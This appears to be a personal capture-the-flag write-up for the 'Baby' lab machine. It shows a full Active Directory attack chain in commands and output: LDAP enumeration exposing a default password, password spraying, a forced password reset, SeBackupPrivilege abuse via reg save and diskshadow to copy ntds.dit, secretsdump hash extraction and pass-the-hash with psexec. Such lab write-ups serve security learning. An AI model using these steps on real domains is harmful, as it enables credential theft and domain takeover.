
![[baby logo.png]]

nmap scan

```
nmap -sVC 10.129.234.71 -p- -oN scan.txt

<SNIP>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-19 14:08:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-19T14:10:04+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-19T14:09:25+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
55232/tcp open  msrpc         Microsoft Windows RPC
55565/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55566/tcp open  msrpc         Microsoft Windows RPC
60414/tcp open  msrpc         Microsoft Windows RPC
60426/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

from the port 3389 with know that the name of our target (commonName) is **BabyDC.baby.v1**

So we add

```
echo "10.129.62.61 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
```

Next we use ldapsearch to enumerate the ldap service

```
ldapsearch -x -H ldap://BabyDC.baby.vl -b "dc=baby,dc=vl" "(objectClass=user)"
```

```
<SNIP>

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z

<SNIP>
```

We found that the Initial password is `BabyStart123!` accord to Teresa.Bell description.

I created an users list to do password spray using netcrackexec

```
nxc smb baby.vl -u users.txt -p 'BabyStart123!'
```
But i didn't get any result

After redoing a ldap searche by filtering with **dn** i found 2 more users

```
ldapsearch -x -b "dc=baby,dc=vl" -H ldap://BabyDC.baby.vl | grep dn
```

Ian.Walker and Caroline.Robinson. I added them to my file and did a password spray again

```
nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
```
![Pasted image 20251120151855](Images/Pasted%20image%2020251120151855.png)

I didn't get valid creds, but i found that Caroline.Robinson must change her password at logon. So after a quick research i found i could change it using **smbpasswd** tool.

```
smbpasswd -U Caroline.Robinson 10.129.62.61
```

![Pasted image 20251120153241](Images/Pasted%20image%2020251120153241.png)

After changing her password, i tried to see if i had valid cred for winrm

```
nxc winrm 10.129.62.61 -u 'Caroline.Robinson' -p 'Password123'
```
And it was valid, so i connected to the target using evil-winrm

```
evil-winrm -u Caroline.Robinson -p Password123 -i 10.129.62.61
```
![Pasted image 20251120153642](Images/Pasted%20image%2020251120153642.png)

I grabbed the user flag on her Desktop folder and i move on to try privilege escalation.

First i wanted to see my privileges

```
whoami /priv
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Ok i have SeBackupPrivilege Enabled. That means i can read and modify any system file while not being blocked by the ACL in place.

In order to exploit this, i decided to copy the SAM and SYSTEM registery key to my folder and downloaded on my machine.

```
reg save hklm\system C:\Users\Caroline.Robinson\Documents\system.hive
```
```
reg save hklm\sam C:\Users\Caroline.Robinson\Documents\sam.hive
```

The i used evil-winrm to download them

![Pasted image 20251120154654](Images/Pasted%20image%2020251120154654.png)

Now i used secretsdump.py to dump the administrator Hash

```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

![Pasted image 20251120154753](Images/Pasted%20image%2020251120154753.png)

But that hash didn't work..

So i had to find another way, after looking on the net i found that the file NTDS.dit contains Domain Hash. But the file was locked so i had to find a way to get it.

After looking on google i found this article
https://blog.s1rn3tz.ovh/post-exploitation/enumeration-elevation-de-privileges/windows/sebackupprivilege-1

Which explains how to get the file ntds.dit using the tool diskshadow along how right SeBackupPrivilege.

But doing so, i copy the entire C: folder to the E: folder to access the file.

First i had to create backup.txt on my machine and putting this text inside

```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias ineX
createX
expose %ine% E:X
end backupX
```

Next i upload it to the target using evil-winrm and then i use `diskshadow` to copy the C Drive to the E drive

```
diskshadow /s backup.txt
```

![Pasted image 20251120161746](Images/Pasted%20image%2020251120161746.png)

After it ended, i copied the file to my current folder

```
robocopy /b e:\windows\ntds . ntds.dit
```

After that, i downloaded it to my machine, and run secretsdump again

```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

![Pasted image 20251120161930](Images/Pasted%20image%2020251120161930.png)


Now that i got a new hash, i ran psexec.py to try to connect to the target

```
psexec.py -hashes 'aad3b<SNIP>cef123d' 'baby.vl/administrator@10.129.62.61'
```

![Pasted image 20251120162053](Images/Pasted%20image%2020251120162053.png)

It worked ! I got the root.txt and that conclude the baby machine